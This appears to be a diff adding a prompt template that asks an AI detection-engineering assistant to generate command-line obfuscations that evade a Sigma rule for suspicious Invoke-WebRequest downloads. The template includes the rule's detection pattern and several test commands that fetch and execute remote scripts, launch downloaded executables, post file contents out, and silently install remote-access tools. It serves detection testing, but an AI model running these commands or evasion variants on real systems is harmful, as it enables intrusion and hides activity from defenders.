@@ -1,0 +1,110 @@
+You are a SIEM detection engineering assistant with expert knowledge of Sigma rules, Windows process creation logs, and command-line parsing.
+
+Your task is to assess whether the given Sigma rule may be bypassed by safe command-line obfuscation/mutation techniques
+
+Allowed command-line mutation techniques:
+
+1. Insertion: Insert characters that the shell/application may ignore or still parse correctly, such as quotes, spaces, or escape characters.
+2. Substitution: Replace syntax with equivalent syntax, such as short option to long option, `/flag` to `-flag`, or equivalent argument forms.
+3. Omission: Remove optional or unnecessary elements while preserving the intended test behavior, such as omitting `.exe` or optional flags.
+4. Reordering: Reorder arguments if the target program accepts different argument order without changing behavior.
+5. Recoding / Encoding: Represent the same value differently, such as environment variables, path normalization, alternative IP notation, or equivalent string representation.
+6. Other  techniques
+
+Analysis procedure:
+
+1. Parse the Sigma rule and identify the fields and exact search terms that are likely to trigger detection.
+2. Compare the rule logic with the true positive test command.
+3. Identify which tokens in the true positive command are semantically important and which tokens are only syntactic indicators used by the rule.
+4. Generate only command-line variants that are safe, simulated, and likely to preserve the intended test behavior.
+5. For each generated command, explain:
+
+   * which mutation technique was used;
+   * which rule condition it is intended to avoid;
+   * why the high-level behavior is expected to remain equivalent in a test environment;
+   * any assumption or uncertainty.
+
+Input:
+
+Sigma Rule:
+
+```yaml
+title: Suspicious Invoke-WebRequest Execution
+id: 5e3cc4d8-3e68-43db-8656-eaaeefdec9cc
+related:
+    - id: e218595b-bbe7-4ee5-8a96-f32a24ad3468
+      type: derived
+status: test
+description: Detects a suspicious call to Invoke-WebRequest cmdlet where the and output is located in a suspicious location
+references:
+    - https://www.sentinelone.com/blog/living-off-windows-defender-lockbit-ransomware-sideloads-cobalt-strike-through-microsoft-security-tool/
+author: Nasreddine Bencherchali (Nextron Systems)
+date: 2022-08-02
+modified: 2025-07-18
+tags:
+    - attack.command-and-control
+    - attack.t1105
+logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection_img:
+        - Image|endswith:
+              - '\powershell_ise.exe'
+              - '\powershell.exe'
+              - '\pwsh.exe'
+        - OriginalFileName:
+              - 'powershell_ise.EXE'
+              - 'PowerShell.EXE'
+              - 'pwsh.dll'
+    selection_commands:
+        CommandLine|contains:
+            # These are all aliases of Invoke-WebRequest
+            - 'curl '
+            - 'Invoke-WebRequest'
+            - 'iwr '
+            - 'wget '
+    selection_flags:
+        CommandLine|contains:
+            - ' -ur'
+            - ' -o'
+    selection_susp_locations:
+        CommandLine|contains:
+            - '\AppData\'
+            - '\Desktop\'
+            - '\Temp\'
+            - '\Users\Public\'
+            - '%AppData%'
+            - '%Public%'
+            - '%Temp%'
+            - '%tmp%'
+            - ':\Windows\'
+    condition: all of selection_*
+falsepositives:
+    - Unknown
+level: high
+```
+
+True positive test command:
+
+```text
+"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;iwr https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe -outfile $env:TEMP\a.exe;start-process $env:TEMP\a.exe
+"powershell.exe" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 IEX (iwr \""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\"" -UseBasicParsing) $macrocode = \"" Open `\""C:\Users\Public\art.jse`\"" For Output As #1`n Write #1, `\""WScript.Quit`\""`n Close #1`n a = Shell(`\""cmd.exe /c wscript.exe //E:jscript C:\Users\Public\art.jse`\"", vbNormalFocus)`n\"" Invoke-MalDoc -macroCode $macrocode -officeProduct \""Word\""}
+"powershell.exe" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 IEX (iwr \""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\"" -UseBasicParsing) $macrocode = \"" Open `\""C:\Users\Public\art.jse`\"" For Output As #1`n Write #1, `\""WScript.Quit`\""`n Close #1`n Shell`$ `\""cscript.exe C:\Users\Public\art.jse`\""`n\"" Invoke-MalDoc -macroCode $macrocode -officeProduct \""Word\""}
+"powershell.exe" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 IEX (iwr \""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\"" -UseBasicParsing) $macrocode = \"" Open `\""C:\Users\Public\art.jse`\"" For Output As #1`n Write #1, `\""WScript.Quit`\""`n Close #1`n Shell`$ `\""ping 8.8.8.8`\""`n\"" Invoke-MalDoc -macroCode $macrocode -officeProduct \""Word\""}
+"powershell.exe" & {$content = Get-Content C:\Windows\System32\notepad.exe Invoke-WebRequest -Uri http://127.0.0.1 -Method POST -Body $content}
+"powershell.exe" & {Invoke-WebRequest -OutFile C:\Users\$env:username\Desktop\AnyDesk.exe https://download.anydesk.com/AnyDesk.exe $file1 = \""C:\Users\\"" + $env:username + \""\Desktop\AnyDesk.exe\"" Start-Process $file1 /S;}
+"powershell.exe" & {Invoke-WebRequest -OutFile C:\Users\$env:username\Desktop\LogMeInIgnition.msi https://secure.logmein.com/LogMeInIgnition.msi $file1 = \""C:\Users\\"" + $env:username + \""\Desktop\LogMeInIgnition.msi\"" Start-Process -Wait $file1 /quiet; Start-Process 'C:\Program Files (x86)\LogMeIn Ignition\LMIIgnition.exe' \""/S\""}
+"powershell.exe" & {Invoke-WebRequest -OutFile C:\Users\$env:username\Desktop\TeamViewer_Setup.exe https://download.teamviewer.com/download/TeamViewer_Setup.exe $file1 = \""C:\Users\\"" + $env:username + \""\Desktop\TeamViewer_Setup.exe\"" Start-Process -Wait $file1 /S; Start-Process 'C:\Program Files (x86)\TeamViewer\TeamViewer.exe'}
+powershell.exe iwr -URI https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt -Outfile C:\Users\thaim\AppData\Local\Temp\Atomic-license.txt
+```
+
+Output JSON schema:
+[
+{
+"output": "A generated simulated command line. Use an empty string only when no safe command can be generated.",
+"explanation": "A short explanation mentioning the mutation technique and the avoided rule condition." "
+}
+]
+
+Return JSON only.
